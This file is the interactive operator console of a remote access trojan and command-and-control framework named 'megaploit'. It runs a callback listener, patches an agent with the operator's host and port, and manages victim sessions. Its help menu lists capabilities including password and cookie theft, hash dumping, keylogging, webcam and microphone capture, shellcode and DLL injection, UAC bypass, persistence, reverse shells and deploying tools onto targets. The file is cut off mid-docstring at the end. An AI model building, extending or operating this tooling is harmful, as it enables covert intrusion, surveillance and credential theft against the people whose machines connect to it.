"""
megaploit.server.cli
~~~~~~~~~~~~~~~~~~~~
Metasploit-style interactive C2 console.

Features
--------
* Animated ASCII banner on startup
* Colour-coded prompt that changes between global context and session context
* Spinner animation while waiting for a connection
* `sessions` command to list/switch between multiple simultaneous sessions
* Tab-completion via readline (where available)
* `use <id>` to switch into a session
* `back` to return to the global prompt
* `help` in any context
* Graceful SIGINT / EOFError handling
"""

from __future__ import annotations

import os
import queue
import re
import ssl
import sys
import threading
import time
import py_compile
from typing import Optional

try:
    import readline  # enables arrow-key history & tab completion
    _HAS_READLINE = True
except ImportError:
    _HAS_READLINE = False

from megaploit.core.crypto import load_key, key_fingerprint
from megaploit.server.commands import dispatch, all_commands, CommandResult
from megaploit.server.listener import Listener, build_ssl_context
from megaploit.server.session import Session
from megaploit.toolbox.registry import registry as _tool_registry
from megaploit.toolbox import installer as _installer
from megaploit.toolbox.updater import UpdateChecker as _UpdateChecker
from megaploit.plugins.loader import plugin_loader as _plugin_loader
from megaploit.plugins.runner import run_plugin_command as _run_plugin_cmd

# ---------------------------------------------------------------------------
# ANSI colour helpers
# ---------------------------------------------------------------------------

_RESET  = "\033[0m"
_BOLD   = "\033[1m"
_DIM    = "\033[2m"
_RED    = "\033[91m"
_GREEN  = "\033[92m"
_YELLOW = "\033[93m"
_BLUE   = "\033[94m"
_CYAN   = "\033[96m"
_WHITE  = "\033[97m"
_GREY   = "\033[90m"

def _c(text: str, *codes: str) -> str:
    """Wrap *text* in ANSI codes, reset at end."""
    return "".join(codes) + text + _RESET


def ok(msg: str)   -> str: return _c(f"[+] {msg}", _GREEN)
def err(msg: str)  -> str: return _c(f"[-] {msg}", _RED)
def info(msg: str) -> str: return _c(f"[*] {msg}", _CYAN)
def warn(msg: str) -> str: return _c(f"[!] {msg}", _YELLOW)


# ---------------------------------------------------------------------------
# ASCII banner
# ---------------------------------------------------------------------------

_BANNER_FRAMES = [
"""
  ███╗   ███╗███████╗ ██████╗  █████╗ ██████╗ ██╗      ██████╗ ██╗████████╗
  ████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
  ██╔████╔██║█████╗  ██║  ███╗███████║██████╔╝██║     ██║   ██║██║   ██║   
  ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   
  ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║██║     ███████╗╚██████╔╝██║   ██║   
  ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
""",
]

_SUBTITLE = "  Professional Remote Access Framework  |  v2.0.0  |  For Authorized Use Only"
_DIVIDER  = "  " + "─" * 74


def _print_banner() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    for frame in _BANNER_FRAMES:
        print(_c(frame, _RED, _BOLD))
        time.sleep(0.04)
    print(_c(_SUBTITLE, _GREY))
    print(_c(_DIVIDER, _GREY))
    print()


# ---------------------------------------------------------------------------
# Spinner
# ---------------------------------------------------------------------------

class _Spinner:
    _FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, message: str) -> None:
        self._msg = message
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        self._thread.join()
        # Clear the spinner line
        sys.stdout.write("\r" + " " * (len(self._msg) + 10) + "\r")
        sys.stdout.flush()

    def _run(self):
        i = 0
        while not self._stop.is_set():
            frame = self._FRAMES[i % len(self._FRAMES)]
            sys.stdout.write(f"\r  {_c(frame, _CYAN)} {_c(self._msg, _GREY)} ")
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1


# ---------------------------------------------------------------------------
# Session table printer
# ---------------------------------------------------------------------------

def _print_sessions(sessions: dict[int, Session]) -> None:
    if not sessions:
        print(info("No active sessions."))
        return
    header = f"  {'ID':<5} {'IP':<18} {'PORT':<8} {'UPTIME':<12}"
    print()
    print(_c(header, _BOLD, _WHITE))
    print(_c("  " + "─" * 46, _GREY))
    for sid, sess in sessions.items():
        print(f"  {_c(str(sid), _CYAN):<14} {_c(sess.ip, _WHITE):<27} {sess.port:<8} {sess.uptime}")
    print()


# ---------------------------------------------------------------------------
# Tab completion
# ---------------------------------------------------------------------------

_GLOBAL_CMDS  = [
    "sessions", "use", "generate", "set", "help", "clear", "exit",
    "toolbox", "plugins",
]
_SESSION_CMDS = list(all_commands().keys()) + ["back", "clear"]

def _completer(text: str, state: int) -> Optional[str]:
    # Combined pool: global + session + installed tools + plugin commands
    tool_names   = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
    plugin_cmds  = _plugin_loader.all_command_names()
    pool = _GLOBAL_CMDS + _SESSION_CMDS + tool_names + plugin_cmds
    options = [c for c in pool if c.startswith(text)]
    return options[state] if state < len(options) else None

if _HAS_READLINE:
    readline.set_completer(_completer)
    readline.parse_and_bind("tab: complete")


# ---------------------------------------------------------------------------
# Main CLI class
# ---------------------------------------------------------------------------

class Console:
    """
    The interactive operator console.  Call run() to start.
    """

    def __init__(self) -> None:
        self._sessions: dict[int, Session] = {}
        self._sessions_lock = threading.Lock()
        self._new_sessions: queue.Queue[Session] = queue.Queue()
        self._listener: Optional[Listener] = None
        self._updater: Optional[_UpdateChecker] = None

        # Server config (set via 'set' or CLI args)
        self.bind_host:   str  = "0.0.0.0"
        self.lhost:       str  = ""
        self.port:        int  = 4444
        self.cert:        str  = ""
        self.key_file:    str  = ""
        self.secret_key:  bytes = b""
        self.allowed_ips: list[str] = []   # empty = allow all
        self.auto_update: bool = False

    # ---------------------------------------------------------------
    # Entry point
    # ---------------------------------------------------------------

    def run(self, bind_host: str, lhost: str, port: int,
            cert: str = "", key_file: str = "",
            secret_key_path: str = "secret.key",
            allowed_ips: list[str] | None = None,
            auto_update: bool = False) -> None:
        self.bind_host   = bind_host
        self.lhost       = lhost
        self.port        = port
        self.cert        = cert
        self.key_file    = key_file
        self.secret_key  = load_key(secret_key_path)
        self.allowed_ips = allowed_ips or []
        self.auto_update = auto_update

        _print_banner()
        fp = key_fingerprint(self.secret_key)
        print(info(f"Key fingerprint : {fp[:8]} {fp[8:]}"))
        if self.allowed_ips:
            print(ok(f"IP allowlist    : {', '.join(self.allowed_ips)}"))
        else:
            print(warn("IP allowlist    : disabled (any IP may attempt auth)"))
        print()
        self._start_updater()
        self._load_plugins()
        self._start_listener()
        self._global_loop()

    # ---------------------------------------------------------------
    # Plugin loader
    # ---------------------------------------------------------------

    def _load_plugins(self) -> None:
        loaded, _errs = _plugin_loader.load_all()
        if loaded:
            print(ok(f"Loaded {loaded} plugin(s) from plugins/"))
        for fname, msg in _plugin_loader.errors():
            print(warn(f"Plugin error in '{fname}': {msg}"))

    # ---------------------------------------------------------------
    # Updater
    # ---------------------------------------------------------------

    def _start_updater(self) -> None:
        self._updater = _UpdateChecker(megaploit_dir=".", auto_update=self.auto_update)
        self._updater.start()
        mode = "auto-update ON" if self.auto_update else "notify only"
        print(info(f"Update checker started (checks every 5 min, {mode})"))

    def _drain_updates(self) -> None:
        if self._updater is None:
            return
        for note in self._updater.drain():
            print(note)

    # ---------------------------------------------------------------
    # Listener management
    # ---------------------------------------------------------------

    def _start_listener(self) -> None:
        ssl_ctx: Optional[ssl.SSLContext] = None
        if self.cert and self.key_file:
            try:
                ssl_ctx = build_ssl_context(self.cert, self.key_file)
                print(ok(f"TLS configured ({self.cert}) — TLS 1.2+ AEAD only"))
            except ssl.SSLError as e:
                print(err(f"TLS error: {e}"))
                sys.exit(1)
        else:
            print(warn("TLS not configured — traffic is unencrypted. Use --cert/--key for production."))

        self._listener = Listener(
            bind_host=self.bind_host,
            port=self.port,
            secret_key=self.secret_key,
            on_session=self._on_new_session,
            ssl_context=ssl_ctx,
            allowed_ips=self.allowed_ips or None,
        )
        self._listener.start()
        print(ok(f"Listener started on {self.bind_host}:{self.port}"))
        print(info(f"Waiting for agents to connect back to {self.lhost}:{self.port}"))
        print()

    def _on_new_session(self, session: Session) -> None:
        with self._sessions_lock:
            self._sessions[session.id] = session
        self._new_sessions.put(session)

    # ---------------------------------------------------------------
    # New-session notification (printed between prompts)
    # ---------------------------------------------------------------

    def _drain_new_sessions(self) -> None:
        while not self._new_sessions.empty():
            try:
                sess = self._new_sessions.get_nowait()
                print()
                print(ok(f"New session #{sess.id} opened — {sess.ip}:{sess.port}"))
                print(info(f"  Type  use {sess.id}  to interact"))
                print()
            except queue.Empty:
                break
        # Also drain update notifications alongside new sessions
        self._drain_updates()

    # ---------------------------------------------------------------
    # Global prompt loop
    # ---------------------------------------------------------------

    def _global_loop(self) -> None:
        print(info("Type  help  for available commands.\n"))
        while True:
            self._drain_new_sessions()
            try:
                prompt = f"\n{_c('megaploit', _RED, _BOLD)} {_c('>', _GREY)} "
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self._shutdown()
                return

            if not raw:
                continue

            parts = raw.split()
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd == "exit":
                self._shutdown()
                return

            elif cmd in ("help", "?"):
                self._global_help()

            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")

            elif cmd == "sessions":
                with self._sessions_lock:
                    _print_sessions(dict(self._sessions))

            elif cmd == "use":
                self._cmd_use(args)

            elif cmd == "generate":
                self._cmd_generate(args)

            elif cmd == "set":
                self._cmd_set(args)

            elif cmd == "toolbox":
                self._cmd_toolbox(args)

            elif cmd in ("toolbox_run", "toolbox_deploy"):
                print(warn(f"  '{cmd}' must be run inside a session."))
                print(info("  Type  use <id>  to enter a session, then run:"))
                print(f"  {cmd} {' '.join(args) if args else '<tool-name>'}")

            elif cmd == "plugins":
                self._cmd_plugins(args)

            elif _plugin_loader.is_plugin_command(cmd):
                pc = _plugin_loader.get_command(cmd)
                result = _run_plugin_cmd(pc, args, lhost=self.lhost, port=self.port)
                self._print_result(result)

            else:
                print(err(f"Unknown command: {cmd}  (type help)"))

    # ---------------------------------------------------------------
    # Session interaction loop
    # ---------------------------------------------------------------

    def _session_loop(self, session: Session) -> None:
        print()
        print(ok(f"Interacting with session #{session.id} ({session.ip})"))
        print(info("Type  help  for commands,  back  to return.\n"))

        while True:
            self._drain_new_sessions()
            try:
                prompt = (
                    f"\n{_c('megaploit', _RED, _BOLD)}"
                    f" {_c('session', _GREY)}({_c(str(session.id), _CYAN)})"
                    f"{_c('>', _GREY)} "
                )
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return

            if not raw:
                continue

            parts = raw.split()
            cmd_name = parts[0].lower()
            args = parts[1:]

            if cmd_name == "back":
                return

            if cmd_name == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            # Redirect toolbox management commands to the global context
            if cmd_name == "toolbox":
                print(warn("  'toolbox' is a global command — type  back  first, then use:"))
                print(f"  toolbox install <url> <name>  /  toolbox list  /  toolbox info <name>")
                continue

            # Dangerous command confirmation — built-in and plugin commands
            cmds = all_commands()
            is_dangerous = (
                (cmd_name in cmds and cmds[cmd_name].dangerous)
                or (
                    _plugin_loader.is_plugin_command(cmd_name)
                    and _plugin_loader.get_command(cmd_name).dangerous
                )
            )
            if is_dangerous:
                confirm = input(warn(f"  {cmd_name} is dangerous. Type YES to confirm: ")).strip()
                if confirm != "YES":
                    print(warn("  Cancelled."))
                    continue

            # Plugin session commands take priority over the C2 dispatcher
            if _plugin_loader.is_plugin_command(cmd_name):
                pc = _plugin_loader.get_command(cmd_name)
                result = _run_plugin_cmd(
                    pc, args,
                    session=session,
                    lhost=self.lhost,
                    port=self.port,
                )
                self._print_result(result)
                if result.close_session:
                    with self._sessions_lock:
                        self._sessions.pop(session.id, None)
                    session.close()
                    print(info(f"Session #{session.id} closed."))
                    return
                continue

            result: CommandResult = dispatch(session, raw)
            self._print_result(result)

            if result.close_session:
                with self._sessions_lock:
                    self._sessions.pop(session.id, None)
                session.close()
                print(info(f"Session #{session.id} closed."))
                return

    # ---------------------------------------------------------------
    # Result renderer
    # ---------------------------------------------------------------

    def _print_result(self, result: CommandResult) -> None:
        if not result.output:
            return
        if result.ok:
            # Colour [+] green, [-] red, [*] cyan within the output
            out = result.output
            out = re.sub(r"^\[\+\]", _c("[+]", _GREEN), out, flags=re.MULTILINE)
            out = re.sub(r"^\[-\]", _c("[-]", _RED),   out, flags=re.MULTILINE)
            out = re.sub(r"^\[\*\]", _c("[*]", _CYAN),  out, flags=re.MULTILINE)
            print(out)
        else:
            print(err(result.output))

    # ---------------------------------------------------------------
    # Sub-commands
    # ---------------------------------------------------------------

    def _cmd_use(self, args: list[str]) -> None:
        if not args or not args[0].isdigit():
            print(err("Usage: use <session_id>"))
            return
        sid = int(args[0])
        with self._sessions_lock:
            session = self._sessions.get(sid)
        if not session:
            print(err(f"No session with ID {sid}"))
            return
        self._session_loop(session)

    def _cmd_generate(self, args: list[str]) -> None:
        """Patch agent.py with LHOST/PORT/USE_TLS and optionally byte-compile it."""
        if not self.lhost or not self.port:
            print(err("Set LHOST and PORT first:  set lhost <ip>  /  set port <port>"))
            return
        use_tls = "--tls" in args or "-t" in args
        _patch_agent(self.lhost, self.port, use_tls=use_tls)
        if "--compile" in args or "-c" in args:
            try:
                py_compile.compile("agent.py", doraise=True)
                print(ok("agent.py byte-compiled"))
            except py_compile.PyCompileError as e:
                print(err(f"Compile error: {e}"))

    def _cmd_set(self, args: list[str]) -> None:
        if len(args) != 2:
            print(err("Usage: set <option> <value>"))
            _show_options(self)
            return
        key, val = args[0].lower(), args[1]
        if key == "lhost":
            self.lhost = val
            print(ok(f"lhost => {val}"))
        elif key == "port":
            try:
                self.port = int(val)
                print(ok(f"port => {val}"))
            except ValueError:
                print(err("port must be an integer"))
        elif key == "cert":
            self.cert = val
            print(ok(f"cert => {val}"))
        elif key == "key":
            self.key_file = val
            print(ok(f"key => {val}"))
        elif key == "auto_update":
            if val.lower() in ("on", "true", "1", "yes"):
                self.auto_update = True
                if self._updater:
                    self._updater.auto_update = True
                print(ok("auto_update => on  (tools will be updated automatically)"))
            elif val.lower() in ("off", "false", "0", "no"):
                self.auto_update = False
                if self._updater:
                    self._updater.auto_update = False
                print(ok("auto_update => off  (update notifications only)"))
            else:
                print(err("auto_update must be on or off"))
        else:
            print(err(f"Unknown option: {key}"))

    # ---------------------------------------------------------------
    # Help screens
    # ---------------------------------------------------------------

    def _global_help(self) -> None:
        tools = _tool_registry.all()
        lines = [
            "",
            _c("  Global Commands", _BOLD, _WHITE),
            _c("  " + "─" * 55, _GREY),
            f"  {'sessions':<32}  List active sessions",
            f"  {'use <id>':<32}  Interact with a session",
            f"  {'generate [-c] [--tls]':<32}  Patch agent.py; -c compiles, --tls enables TLS",
            f"  {'set <opt> <val>':<32}  Set lhost / port / cert / key / auto_update",
            f"  {'toolbox install <url> <name>':<32}  Install a GitHub tool",
            f"  {'toolbox list':<32}  Show installed tools",
            f"  {'toolbox search <query>':<32}  Search installed tools",
            f"  {'toolbox info <name>':<32}  Show tool details",
            f"  {'toolbox update <name>':<32}  Pull latest changes",
            f"  {'toolbox remove <name>':<32}  Uninstall a tool",
            f"  {'toolbox set-entry <name> <path>':<32}  Override entry-point",
            f"  {'clear':<32}  Clear the terminal",
            f"  {'exit':<32}  Quit Megaploit",
            "",
            _c("  Options", _BOLD, _WHITE),
            _c("  " + "─" * 55, _GREY),
            f"  {'lhost':<32}  {self.lhost or '(not set)'}",
            f"  {'port':<32}  {self.port}",
            f"  {'cert':<32}  {self.cert or '(none)'}",
            f"  {'key':<32}  {self.key_file or '(none)'}",
            f"  {'auto_update':<32}  {'on' if self.auto_update else 'off'}",
            "",
            _c("  Session Commands (inside  use <id> )", _BOLD, _WHITE),
            _c("  " + "─" * 55, _GREY),
            f"  {'File transfer':<32}  upload  download  zip_download",
            f"  {'Screen / audio':<32}  screenshot  screenshot_timelapse  record  mic_level",
            f"  {'Screen record':<32}  screenrecord <secs>",
            f"  {'Streaming':<32}  screen_stream  webcam",
            f"  {'Credentials':<32}  hashdump  wifi_passwords  browser_history",
            f"  {'Browser':<32}  browser_creds [cookies|passwords|all]",
            f"  {'Adv. creds':<32}  cred_vault  ssh_harvest  sudo_sniff",
            f"  {'Search':<32}  search <path> <keyword>",
            f"  {'Clipboard':<32}  getclip  setclip",
            f"  {'Network pivot':<32}  portfwd  socks5  reverse_shell [!]",
            f"  {'Awareness':<32}  idle_time  sysinfo  mic_level",
            f"  {'GUI / input':<32}  msgbox  mouse_move  type_keys  lock_screen",
            f"  {'Injection':<32}  inject_shellcode [!]  dll_inject [!]",
            f"  {'Priv. esc.':<32}  uac_bypass [!]  token_steal [!]",
            f"  {'LOLBins':<32}  living_off_land [!]",
            f"  {'Persistence':<32}  persist  keylog_start/dump/stop",
            f"  {'Cleanup':<32}  self_destruct [!]",
            f"  {'Toolbox':<32}  toolbox_run <name>  toolbox_deploy <name>",
            f"  {'Shell passthrough':<32}  any unrecognised command runs as shell",
            "",
        ]
        if tools:
            lines += [
                _c("  Installed Tools", _BOLD, _WHITE),
                _c("  " + "─" * 50, _GREY),
            ]
            for t in tools:
                status = _c("✔", _GREEN) if t.is_installed else _c("✘", _RED)
                lines.append(f"  {status} {_c(t.name, _CYAN):<22}  {t.description[:55]}")
            lines.append("")

        plugins = _plugin_loader.plugins()
        if plugins:
            lines += [
                _c("  Loaded Plugins", _BOLD, _WHITE),
                _c("  " + "─" * 50, _GREY),
            ]
            for p in plugins:
                ncmds = len(p.commands)
                lines.append(
                    f"  {_c(p.name, _CYAN):<22}  v{p.version}  "
                    f"{_c(p.description[:40], _GREY)}  "
                    f"{_c(f'({ncmds} cmd)', _DIM)}"
                )
            lines.append("")

        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Toolbox command dispatcher
    # ---------------------------------------------------------------

    def _cmd_toolbox(self, args: list[str]) -> None:
        """
        toolbox install <repo_url> <name> [description] [--tags a,b,c]
        toolbox list
        toolbox search <query>
        toolbox info <name>
        toolbox remove <name>
        toolbox update <name>
        toolbox rebuild <name>
        toolbox set-entry <name> <entry_path>
        """
        if not args:
            self._toolbox_help()
            return

        sub = args[0].lower()
        rest = args[1:]

        if sub == "install":
            self._toolbox_install(rest)
        elif sub == "list":
            self._toolbox_list()
        elif sub == "search":
            self._toolbox_search(rest)
        elif sub == "info":
            self._toolbox_info(rest)
        elif sub == "remove":
            self._toolbox_remove(rest)
        elif sub == "update":
            self._toolbox_update(rest)
        elif sub == "update-all":
            self._toolbox_update_all()
        elif sub == "check-updates":
            self._toolbox_check_updates()
        elif sub == "rebuild":
            self._toolbox_rebuild(rest)
        elif sub == "set-entry":
            self._toolbox_set_entry(rest)
        else:
            print(err(f"Unknown toolbox sub-command: {sub}"))
            self._toolbox_help()

    # ------------------------------------------------------------------

    def _toolbox_install(self, args: list[str]) -> None:
        """
        toolbox install <repo_url> <name> [description] [--tags tag1,tag2]
        """
        if len(args) < 2:
            print(err("Usage: toolbox install <repo_url> <name> [description] [--tags a,b]"))
            return

        repo_url = args[0]
        name     = args[1]

        # Parse optional description and --tags
        description = ""
        tags: list[str] = []
        i = 2
        while i < len(args):
            if args[i] == "--tags" and i + 1 < len(args):
                tags = [t.strip() for t in args[i + 1].split(",")]
                i += 2
            else:
                description += (" " if description else "") + args[i]
                i += 1

        print(info(f"Installing '{name}' from {repo_url}"))
        print()

        def _progress(line: str) -> None:
            # Colour [+]/[-]/[*] lines, pass the rest through dim
            if line.startswith("[+]"):
                print(_c(line, _GREEN))
            elif line.startswith("[-]"):
                print(_c(line, _RED))
            elif line.startswith("[*]"):
                print(_c(line, _CYAN))
            elif line.startswith("[!]"):
                print(_c(line, _YELLOW))
            else:
                print(_c(line, _GREY))

        try:
            with _Spinner(f"Cloning {repo_url}…"):
                tool = _installer.install(
                    repo_url=repo_url,
                    name=name,
                    description=description,
                    tags=tags,
                    progress=_progress,
                )
            print()
            print(ok(f"Tool '{name}' installed successfully."))
            print(info(f"  Entry-point : {tool.entry}"))
            print(info(f"  Path        : {tool.path}"))
            print(info(f"  Run locally : toolbox_run {name} [args]  (inside a session)"))
            print(info(f"  Deploy      : toolbox_deploy {name} [args]  (inside a session)"))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_list(self) -> None:
        tools = _tool_registry.all()
        if not tools:
            print(info("No tools installed.  Use:  toolbox install <url> <name>"))
            return
        print()
        hdr = f"  {'NAME':<18} {'STATUS':<10} {'ENTRY':<22} {'DESCRIPTION'}"
        print(_c(hdr, _BOLD, _WHITE))
        print(_c("  " + "─" * 72, _GREY))
        for t in tools:
            status = _c("installed", _GREEN) if t.is_installed else _c("missing",  _RED)
            desc   = t.description[:40] + ("…" if len(t.description) > 40 else "")
            print(f"  {_c(t.name, _CYAN):<27} {status:<19} {t.entry:<22} {_c(desc, _GREY)}")
        print()

    def _toolbox_search(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox search <query>"))
            return
        query = " ".join(args)
        results = _tool_registry.search(query)
        if not results:
            print(info(f"No tools match '{query}'."))
            return
        print()
        for t in results:
            status = _c("✔", _GREEN) if t.is_installed else _c("✘", _RED)
            print(f"  {status} {_c(t.name, _CYAN):<22}  {t.description[:60]}")
            print(f"     {_c(t.repo, _GREY)}")
        print()

    def _toolbox_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox info <name>"))
            return
        t = _tool_registry.get(args[0])
        if not t:
            print(err(f"Tool '{args[0]}' not found."))
            return
        installed = _c("yes", _GREEN) if t.is_installed else _c("no", _RED)
        run_cmd_str = " ".join(t.run_cmd) if t.run_cmd else _c("(auto)", _GREY)
        print()
        print(f"  {_c('Name', _BOLD):<22}  {_c(t.name, _CYAN)}")
        print(f"  {'Repo':<18}  {t.repo}")
        print(f"  {'Description':<18}  {t.description}")
        print(f"  {'Language':<18}  {_c(t.lang, _YELLOW)}")
        print(f"  {'Run command':<18}  {run_cmd_str}")
        print(f"  {'Entry-point':<18}  {t.entry}")
        print(f"  {'Path':<18}  {t.path}")
        print(f"  {'Installed':<18}  {installed}")
        print(f"  {'Installed at':<18}  {t.installed_at or 'unknown'}")
        if t.tags:
            print(f"  {'Tags':<18}  {', '.join(t.tags)}")
        print()
        print(f"  {_c('Session usage:', _BOLD, _WHITE)}")
        print(f"    toolbox_run {t.name} [tool-args]       ← run locally vs target")
        print(f"    toolbox_deploy {t.name} [tool-args]    ← run on the target machine")
        print()

    def _toolbox_remove(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox remove <name>"))
            return
        name = args[0]
        confirm = input(warn(f"  Remove '{name}' and delete its directory? (yes/no): ")).strip()
        if confirm.lower() != "yes":
            print(warn("  Cancelled."))
            return
        try:
            _installer.uninstall(name, progress=print)
            print(ok(f"'{name}' removed."))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox update <name>"))
            return
        try:
            _installer.update(args[0], progress=print)
            # Re-check so the update badge clears
            if self._updater:
                self._updater.check_now()
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update_all(self) -> None:
        """Pull latest changes for every installed tool."""
        tools = _tool_registry.all()
        if not tools:
            print(info("No tools installed."))
            return
        any_ok = False
        for t in tools:
            if not t.is_installed:
                print(warn(f"  Skipping '{t.name}' — directory not found"))
                continue
            try:
                print(info(f"Updating '{t.name}'…"))
                _installer.update(t.name, progress=lambda l: print(f"  {l}"))
                any_ok = True
            except RuntimeError as e:
                print(err(f"  {t.name}: {e}"))
        if any_ok and self._updater:
            self._updater.check_now()

    def _toolbox_check_updates(self) -> None:
        """Force an immediate update check for all tools and Megaploit itself."""
        print(info("Checking for updates…"))
        if self._updater:
            self._updater.check_now()
            time.sleep(2)   # give background thread a moment to finish
            for note in self._updater.drain():
                print(note)
        else:
            print(warn("Update checker not running (git not on PATH?)."))

    def _toolbox_rebuild(self, args: list[str]) -> None:
        """Re-run the build step for an already-installed tool (no git pull)."""
        if not args:
            print(err("Usage: toolbox rebuild <name>"))
            return
        name = args[0]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        if not t.is_installed:
            print(err(f"Tool directory missing: {t.path}"))
            return
        print(info(f"Rebuilding '{name}'…"))
        try:
            t.run_cmd = _installer.build(t.path, name, t.lang, progress=print)
            new_entry = _installer.detect_entry(t.path, name, t.lang)
            t.entry = new_entry
            _tool_registry.add(t)
            print(ok(f"'{name}' rebuilt.  Entry: {new_entry}  run_cmd: {t.run_cmd}"))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_set_entry(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: toolbox set-entry <name> <entry_path>"))
            return
        name, entry = args[0], args[1]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        t.entry = entry
        _tool_registry.add(t)   # re-saves with updated entry
        print(ok(f"Entry-point for '{name}' set to: {entry}"))

    def _toolbox_help(self) -> None:
        lines = [
            "",
            _c("  toolbox sub-commands", _BOLD, _WHITE),
            _c("  " + "─" * 50, _GREY),
            f"  {'toolbox install <url> <name>':<36}  Clone & install from GitHub",
            f"  {'toolbox list':<36}  Show all installed tools",
            f"  {'toolbox search <query>':<36}  Search by name/tag/description",
            f"  {'toolbox info <name>':<36}  Show tool details & usage",
            f"  {'toolbox update <name>':<36}  Pull latest changes (git pull)",
            f"  {'toolbox update-all':<36}  Update every installed tool at once",
            f"  {'toolbox check-updates':<36}  Check now for available updates",
            f"  {'toolbox remove <name>':<36}  Uninstall a tool",
            f"  {'toolbox rebuild <name>':<36}  Re-run build step (no git pull)",
            f"  {'toolbox set-entry <name> <path>':<36}  Override the entry-point",
            "",
            _c("  Inside a session:", _BOLD, _WHITE),
            _c("  " + "─" * 50, _GREY),
            f"  {'toolbox_run <name> [args]':<36}  Run tool locally (operator side)",
            f"  {'toolbox_deploy <name> [args]':<36}  Upload & run tool on target",
            "",
        ]
        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Plugins command
    # ---------------------------------------------------------------

    def _cmd_plugins(self, args: list[str]) -> None:
        """
        plugins              — list all loaded plugins and their commands
        plugins reload       — re-scan plugins/ and reload everything
        plugins info <name>  — show full details for one plugin
        """
        sub = args[0].lower() if args else "list"

        if sub in ("list", "ls"):
            self._plugins_list()
        elif sub == "reload":
            self._plugins_reload()
        elif sub == "info":
            self._plugins_info(args[1:])
        else:
            # Treat unknown sub-commands as the plugin name for quick info
            self._plugins_info(args)

    def _plugins_list(self) -> None:
        plugins = _plugin_loader.plugins()
        if not plugins:
            print(info("No plugins loaded."))
            print(info("Drop a .toml file into the  plugins/  directory and run  plugins reload"))
            return
        print()
        hdr = f"  {'PLUGIN':<20} {'VER':<10} {'CMDS':<6} {'DESCRIPTION'}"
        print(_c(hdr, _BOLD, _WHITE))
        print(_c("  " + "─" * 68, _GREY))
        for p in plugins:
            ncmds = str(len(p.commands))
            desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
            print(
                f"  {_c(p.name, _CYAN):<29} {p.version:<10} {ncmds:<6} {_c(desc, _GREY)}"
            )
        print()
        # Show all plugin command names for tab-complete awareness
        all_cmd_names = _plugin_loader.all_command_names()
        if all_cmd_names:
            print(_c("  Plugin commands:", _BOLD, _WHITE))
            for cname in all_cmd_names:
                pc = _plugin_loader.get_command(cname)
                tag = _c(" [!]", _RED) if pc.dangerous else ""
                print(f"    {_c(cname, _GREEN):<28}  {pc.description}{tag}")
            print()

    def _plugins_reload(self) -> None:
        print(info("Reloading plugins…"))
        loaded, _errs = _plugin_loader.load_all()
        if loaded:
            print(ok(f"Loaded {loaded} plugin(s)."))
        else:
            print(info("No plugins found in  plugins/"))
        for fname, msg in _plugin_loader.errors():
            print(warn(f"  Error in '{fname}': {msg}"))

    def _plugins_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: plugins info <name>"))
            return
        p = _plugin_loader.get(args[0])
        if not p:
            print(err(f"Plugin '{args[0]}' not loaded."))
            return
        print()
        print(f"  {_c('Name', _BOLD):<22}  {_c(p.name, _CYAN)}")
        print(f"  {'Version':<18}  {p.version}")
        print(f"  {'Author':<18}  {p.author or '(unknown)'}")
        print(f"  {'Description':<18}  {p.description}")
        print(f"  {'Source file':<18}  {p.source_path}")
        print()
        if p.commands:
            print(_c("  Commands:", _BOLD, _WHITE))
            print(_c("  " + "─" * 60, _GREY))
            for pc in p.commands:
                tag = _c("  [dangerous]", _RED) if pc.dangerous else ""
                kind_col = _c(f"[{pc.kind}]", _YELLOW)
                print(f"  {_c(pc.usage or pc.name, _GREEN):<30}  {kind_col}  {pc.description}{tag}")
        print()

    # ---------------------------------------------------------------
    # Shutdown
    # ---------------------------------------------------------------

    def _shutdown(self) -> None:
        print()
        print(info("Shutting down…"))
        if self._updater:
            self._updater.stop()
        if self._listener:
            self._listener.stop()
        with self._sessions_lock:
            for sess in self._sessions.values():
                sess.close()
        print(ok("Goodbye."))


def _show_options(console: Console) -> None:
    print(f"\n  {'Option':<10}  Value")
    print(f"  {'─' * 10}  {'─' * 20}")
    print(f"  {'lhost':<10}  {console.lhost or '(not set)'}")
    print(f"  {'port':<10}  {console.port}")
    print(f"  {'cert':<10}  {console.cert or '(none)'}")
    print(f"  {'key':<10}  {console.key_file or '(none)'}")
    print()


# ---------------------------------------------------------------------------
# Agent patcher
# ---------------------------------------------------------------------------

def _patch_agent(lhost: str, port: int, use_tls: bool = False) -> None:
    """
    Patch LHOST/PORT/USE_TLS values in agent.py so the agent connects back
    to the correct server.  Also patches megaploit/agent/connection.py directly
